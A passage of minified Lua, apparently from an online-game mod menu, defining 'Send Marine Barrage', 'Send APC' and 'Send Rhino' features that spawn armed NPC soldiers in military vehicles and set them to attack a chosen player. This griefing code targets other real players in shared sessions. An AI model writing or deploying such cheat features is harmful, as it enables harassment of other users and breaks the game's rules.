bility(Army2[e],2)ped.set_ped_combat_movement(Army2[e],1)ped.set_ped_max_health(Army2[e],328.0)ped.set_ped_health(Army2[e],328.0)ped.set_ped_config_flag(Army2[e],187,0)ped.set_ped_can_ragdoll(Army2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army2[e],l)end;ped.set_ped_into_vehicle(Army2[e],ArmyTransport[k],1)local e=#Army2+1;Army2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army2>=8 then end;entity.set_entity_god_mode(Army2[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army2[e],46,false)weapon.give_delayed_weapon_to_ped(Army2[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army2[e],1,true)ped.set_ped_combat_attributes(Army2[e],3,true)ped.set_ped_prop_index(Army2[e],0,0,0,0)ped.set_ped_combat_attributes(Army2[e],2,true)ped.set_ped_combat_attributes(Army2[e],52,false)ped.set_ped_combat_attributes(Army2[e],4,true)ped.set_ped_combat_range(Army2[e],2)ped.set_ped_combat_ability(Army2[e],2)ped.set_ped_combat_movement(Army2[e],1)ped.set_ped_max_health(Army2[e],328.0)ped.set_ped_health(Army2[e],328.0)ped.set_ped_config_flag(Army2[e],187,0)ped.set_ped_can_ragdoll(Army2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army2[e],l)end;ped.set_ped_into_vehicle(Army2[e],ArmyTransport[k],2)local e=#Army2+1;Army2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army2>=8 then end;entity.set_entity_god_mode(Army2[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army2[e],46,false)weapon.give_delayed_weapon_to_ped(Army2[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army2[e],1,true)ped.set_ped_combat_attributes(Army2[e],3,true)ped.set_ped_prop_index(Army2[e],0,0,0,0)ped.set_ped_combat_attributes(Army2[e],2,true)ped.set_ped_combat_attributes(Army2[e],52,false)ped.set_ped_combat_attributes(Army2[e],4,true)ped.set_ped_combat_range(Army2[e],2)ped.set_ped_combat_ability(Army2[e],2)ped.set_ped_combat_movement(Army2[e],1)ped.set_ped_max_health(Army2[e],328.0)ped.set_ped_health(Army2[e],328.0)ped.set_ped_config_flag(Army2[e],187,0)ped.set_ped_can_ragdoll(Army2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army2[e],l)end;ped.set_ped_into_vehicle(Army2[e],ArmyTransport[k],3)local e=#Army2+1;Army2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army2>=8 then end;entity.set_entity_god_mode(Army2[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army2[e],46,false)weapon.give_delayed_weapon_to_ped(Army2[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army2[e],1,true)ped.set_ped_combat_attributes(Army2[e],3,true)ped.set_ped_prop_index(Army2[e],0,0,0,0)ped.set_ped_combat_attributes(Army2[e],2,true)ped.set_ped_combat_attributes(Army2[e],52,false)ped.set_ped_combat_attributes(Army2[e],4,true)ped.set_ped_combat_range(Army2[e],2)ped.set_ped_combat_ability(Army2[e],2)ped.set_ped_combat_movement(Army2[e],1)ped.set_ped_max_health(Army2[e],328.0)ped.set_ped_health(Army2[e],328.0)ped.set_ped_config_flag(Army2[e],187,0)ped.set_ped_can_ragdoll(Army2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army2[e],l)end;ped.set_ped_into_vehicle(Army2[e],ArmyTransport[k],4)local e=#Army2+1;Army2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army2>=8 then end;entity.set_entity_god_mode(Army2[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army2[e],46,false)weapon.give_delayed_weapon_to_ped(Army2[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army2[e],1,true)ped.set_ped_combat_attributes(Army2[e],3,true)ped.set_ped_prop_index(Army2[e],0,0,0,0)ped.set_ped_combat_attributes(Army2[e],2,true)ped.set_ped_combat_attributes(Army2[e],52,false)ped.set_ped_combat_attributes(Army2[e],4,true)ped.set_ped_combat_range(Army2[e],2)ped.set_ped_combat_ability(Army2[e],2)ped.set_ped_combat_movement(Army2[e],1)ped.set_ped_max_health(Army2[e],328.0)ped.set_ped_health(Army2[e],328.0)ped.set_ped_config_flag(Army2[e],187,0)ped.set_ped_can_ragdoll(Army2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army2[e],l)end;ped.set_ped_into_vehicle(Army2[e],ArmyTransport[k],5)local e=#Army2+1;Army2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army2>=8 then end;entity.set_entity_god_mode(Army2[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army2[e],46,false)weapon.give_delayed_weapon_to_ped(Army2[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army2[e],1,true)ped.set_ped_combat_attributes(Army2[e],3,true)ped.set_ped_prop_index(Army2[e],0,0,0,0)ped.set_ped_combat_attributes(Army2[e],2,true)ped.set_ped_combat_attributes(Army2[e],52,false)ped.set_ped_combat_attributes(Army2[e],4,true)ped.set_ped_combat_range(Army2[e],2)ped.set_ped_combat_ability(Army2[e],2)ped.set_ped_combat_movement(Army2[e],1)ped.set_ped_max_health(Army2[e],328.0)ped.set_ped_health(Army2[e],328.0)ped.set_ped_config_flag(Army2[e],187,0)ped.set_ped_can_ragdoll(Army2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army2[e],l)end;ped.set_ped_into_vehicle(Army2[e],ArmyTransport[k],6)while g.on do ai.task_combat_ped(Army2[e],h,0,16)system.wait(25)if entity.is_entity_dead(Army2[e])then return HANDLER_CONTINUE end;system.wait(25)for e=1,#Army2 do system.wait(25)ai.task_combat_ped(Army2[e],h,0,16)if utilities.get_distance_between(h,Army2[e])>2000 then network.request_control_of_entity(Army2[e])entity.set_entity_as_no_longer_needed(Army2[e])network.request_control_of_entity(ArmyTransport[k])entity.set_entity_as_no_longer_needed(ArmyTransport[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Army2 do ped.get_all_peds(Army2[e])system.wait(25)network.request_control_of_entity(Army2[e])entity.set_entity_coords_no_offset(Army2[e],d)entity.set_entity_as_no_longer_needed(Army2[e])entity.delete_entity(Army2[e])end;for k=1,#ArmyTransport do vehicle.get_all_vehicles(ArmyTransport[k])system.wait(25)network.request_control_of_entity(ArmyTransport[k])entity.set_entity_coords_no_offset(ArmyTransport[k],d)entity.set_entity_as_no_longer_needed(ArmyTransport[k])entity.delete_entity(ArmyTransport[k])end end)playerfeature["Send Marine Barrage"]=menu.add_player_feature("Send Marine Barrage","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Army3+1;Army3[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army3>=8 then end;entity.set_entity_god_mode(Army3[e],false)streaming.set_model_as_no_longer_needed(i)local j=0xF34DFB25;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#ArmyBarrage+1;ArmyBarrage[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(ArmyBarrage[k],false)vehicle.set_vehicle_mod_kit_type(ArmyBarrage[k],0)vehicle.get_vehicle_mod(ArmyBarrage[k],0)vehicle.set_vehicle_mod(ArmyBarrage[k],0,0,false)vehicle.set_vehicle_mod(ArmyBarrage[k],0,1,false)ped.set_ped_combat_attributes(Army3[e],46,true)weapon.give_delayed_weapon_to_ped(Army3[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army3[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army3[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army3[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army3[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army3[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army3[e],1,true)ped.set_ped_combat_attributes(Army3[e],3,false)ped.set_ped_combat_attributes(Army3[e],2,false)ped.set_ped_combat_attributes(Army3[e],52,false)ped.set_ped_combat_attributes(Army3[e],4,true)ped.set_ped_combat_range(Army3[e],2)ped.set_ped_combat_ability(Army3[e],2)ped.set_ped_combat_movement(Army3[e],1)ped.set_ped_max_health(Army3[e],328.0)ped.set_ped_health(Army3[e],328.0)ped.set_ped_config_flag(Army3[e],187,0)ped.set_ped_can_ragdoll(Army3[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army3[e],l)end;ped.set_ped_into_vehicle(Army3[e],ArmyBarrage[k],-1)local e=#Army3+1;Army3[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army3>=8 then end;entity.set_entity_god_mode(Army3[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army3[e],46,true)weapon.give_delayed_weapon_to_ped(Army3[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army3[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army3[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army3[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army3[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army3[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army3[e],1,true)ped.set_ped_combat_attributes(Army3[e],3,false)ped.set_ped_combat_attributes(Army3[e],2,false)ped.set_ped_combat_attributes(Army3[e],52,false)ped.set_ped_combat_attributes(Army3[e],4,true)ped.set_ped_combat_range(Army3[e],2)ped.set_ped_combat_ability(Army3[e],2)ped.set_ped_combat_movement(Army3[e],1)ped.set_ped_max_health(Army3[e],328.0)ped.set_ped_health(Army3[e],328.0)ped.set_ped_config_flag(Army3[e],187,0)ped.set_ped_can_ragdoll(Army3[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army3[e],l)end;ped.set_ped_into_vehicle(Army3[e],ArmyBarrage[k],1)local e=#Army3+1;Army3[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army3>=8 then end;entity.set_entity_god_mode(Army3[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army3[e],46,true)weapon.give_delayed_weapon_to_ped(Army3[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army3[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army3[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army3[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army3[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army3[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army3[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army3[e],1,true)ped.set_ped_combat_attributes(Army3[e],3,false)ped.set_ped_combat_attributes(Army3[e],2,true)ped.set_ped_combat_attributes(Army3[e],52,false)ped.set_ped_combat_attributes(Army3[e],4,true)ped.set_ped_combat_range(Army3[e],2)ped.set_ped_combat_ability(Army3[e],2)ped.set_ped_combat_movement(Army3[e],1)ped.set_ped_max_health(Army3[e],328.0)ped.set_ped_health(Army3[e],328.0)ped.set_ped_config_flag(Army3[e],187,0)ped.set_ped_can_ragdoll(Army3[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army3[e],l)end;ped.set_ped_into_vehicle(Army3[e],ArmyBarrage[k],2)while g.on do ai.task_combat_ped(Army3[e],h,0,16)system.wait(25)if entity.is_entity_dead(Army3[e])then return HANDLER_CONTINUE end;for e=1,#Army3 do system.wait(25)ai.task_combat_ped(Army3[e],h,0,16)if utilities.get_distance_between(h,Army3[e])>1000 then network.request_control_of_entity(Army3[e])entity.set_entity_as_no_longer_needed(Army3[e])network.request_control_of_entity(ArmyBarrage[k])entity.set_entity_as_no_longer_needed(ArmyBarrage[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Army3 do ped.get_all_peds(Army3[e])system.wait(25)network.request_control_of_entity(Army3[e])entity.set_entity_coords_no_offset(Army3[e],d)entity.set_entity_as_no_longer_needed(Army3[e])entity.delete_entity(Army3[e])end;for k=1,#ArmyBarrage do vehicle.get_all_vehicles(ArmyBarrage[k])system.wait(25)network.request_control_of_entity(ArmyBarrage[k])entity.set_entity_coords_no_offset(ArmyBarrage[k],d)entity.set_entity_as_no_longer_needed(ArmyBarrage[k])entity.delete_entity(ArmyBarrage[k])end end)playerfeature["Send APC"]=menu.add_player_feature("Send APC","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Army4+1;Army4[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army4>=8 then end;entity.set_entity_god_mode(Army4[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x2189D250;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#ArmyAPC+1;ArmyAPC[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(ArmyAPC[k],false)vehicle.set_vehicle_mod_kit_type(ArmyAPC[k],0)vehicle.get_vehicle_mod(ArmyAPC[k],40)vehicle.set_vehicle_mod(ArmyAPC[k],40,3,true)ped.set_ped_combat_attributes(Army4[e],46,false)weapon.give_delayed_weapon_to_ped(Army4[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army4[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army4[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army4[e],1,true)ped.set_ped_combat_attributes(Army4[e],3,false)ped.set_ped_combat_attributes(Army4[e],2,false)ped.set_ped_combat_attributes(Army4[e],52,false)ped.set_ped_combat_attributes(Army4[e],4,true)ped.set_ped_combat_range(Army4[e],2)ped.set_ped_combat_ability(Army4[e],2)ped.set_ped_combat_movement(Army4[e],2)ped.set_ped_max_health(Army4[e],328.0)ped.set_ped_health(Army4[e],328.0)ped.set_ped_config_flag(Army4[e],187,0)ped.set_ped_can_ragdoll(Army4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army4[e],l)end;ped.set_ped_into_vehicle(Army4[e],ArmyAPC[k],-1)local e=#Army4+1;Army4[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army4>=8 then end;entity.set_entity_god_mode(Army4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army4[e],46,false)weapon.give_delayed_weapon_to_ped(Army4[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army4[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army4[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army4[e],1,true)ped.set_ped_combat_attributes(Army4[e],3,false)ped.set_ped_combat_attributes(Army4[e],2,true)ped.set_ped_combat_attributes(Army4[e],52,false)ped.set_ped_combat_attributes(Army4[e],4,true)ped.set_ped_combat_range(Army4[e],2)ped.set_ped_combat_ability(Army4[e],2)ped.set_ped_combat_movement(Army4[e],2)ped.set_ped_max_health(Army4[e],328.0)ped.set_ped_health(Army4[e],328.0)ped.set_ped_config_flag(Army4[e],187,0)ped.set_ped_can_ragdoll(Army4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army4[e],l)end;ped.set_ped_into_vehicle(Army4[e],ArmyAPC[k],0)local e=#Army4+1;Army4[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army4>=8 then end;entity.set_entity_god_mode(Army4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army4[e],46,false)weapon.give_delayed_weapon_to_ped(Army4[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army4[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army4[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army4[e],1,true)ped.set_ped_combat_attributes(Army4[e],3,false)ped.set_ped_combat_attributes(Army4[e],2,true)ped.set_ped_combat_attributes(Army4[e],52,false)ped.set_ped_combat_attributes(Army4[e],4,true)ped.set_ped_combat_range(Army4[e],2)ped.set_ped_combat_ability(Army4[e],2)ped.set_ped_combat_movement(Army4[e],2)ped.set_ped_max_health(Army4[e],328.0)ped.set_ped_health(Army4[e],328.0)ped.set_ped_config_flag(Army4[e],187,0)ped.set_ped_can_ragdoll(Army4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army4[e],l)end;ped.set_ped_into_vehicle(Army4[e],ArmyAPC[k],1)local e=#Army4+1;Army4[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army4>=8 then end;entity.set_entity_god_mode(Army4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army4[e],46,false)weapon.give_delayed_weapon_to_ped(Army4[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army4[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army4[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army4[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army4[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army4[e],1,true)ped.set_ped_combat_attributes(Army4[e],3,false)ped.set_ped_combat_attributes(Army4[e],2,true)ped.set_ped_combat_attributes(Army4[e],52,false)ped.set_ped_combat_attributes(Army4[e],4,true)ped.set_ped_combat_range(Army4[e],2)ped.set_ped_combat_ability(Army4[e],2)ped.set_ped_combat_movement(Army4[e],2)ped.set_ped_max_health(Army4[e],328.0)ped.set_ped_health(Army4[e],328.0)ped.set_ped_config_flag(Army4[e],187,0)ped.set_ped_can_ragdoll(Army4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army4[e],l)end;ped.set_ped_into_vehicle(Army4[e],ArmyAPC[k],2)while g.on do ai.task_combat_ped(Army4[e],h,0,16)system.wait(25)if entity.is_entity_dead(Army4[e])then return HANDLER_CONTINUE end;for e=1,#Army4 do system.wait(25)ai.task_combat_ped(Army4[e],h,0,16)if utilities.get_distance_between(h,Army4[e])>1000 then network.request_control_of_entity(Army4[e])entity.set_entity_as_no_longer_needed(Army4[e])network.request_control_of_entity(ArmyAPC[k])entity.set_entity_as_no_longer_needed(ArmyAPC[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Army4 do ped.get_all_peds(Army4[e])system.wait(25)network.request_control_of_entity(Army4[e])entity.set_entity_coords_no_offset(Army4[e],d)entity.set_entity_as_no_longer_needed(Army4[e])entity.delete_entity(Army4[e])end;for k=1,#ArmyAPC do vehicle.get_all_vehicles(ArmyAPC[k])system.wait(25)network.request_control_of_entity(ArmyAPC[k])entity.set_entity_coords_no_offset(ArmyAPC[k],d)entity.set_entity_as_no_longer_needed(ArmyAPC[k])entity.delete_entity(ArmyAPC[k])end end)playerfeature["Send Rhino"]=menu.add_player_feature("Send Rhino","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Army5+1;Army5[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army5>=8 then end;entity.set_entity_god_mode(Army5[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x2EA68690;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local 